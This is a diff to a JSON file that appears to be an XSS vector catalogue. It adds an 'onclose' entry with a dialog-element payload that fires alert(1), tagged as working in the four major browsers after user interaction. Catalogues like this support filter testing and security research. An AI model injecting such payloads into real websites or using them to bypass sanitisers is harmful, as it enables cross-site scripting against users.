@@ -1,4 +1,20 @@
 {
+    "onclose": {
+        "description": "Fires when a dialog is closed",
+        "tags": [
+            {
+                "tag": "dialog",
+                "code": "<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "edge",
+                    "safari"
+                ],
+                "interaction": true
+            }
+        ]       
+    },
     "onbeforescriptexecute": {
         "description": "Fires before script is executed",
         "tags": [
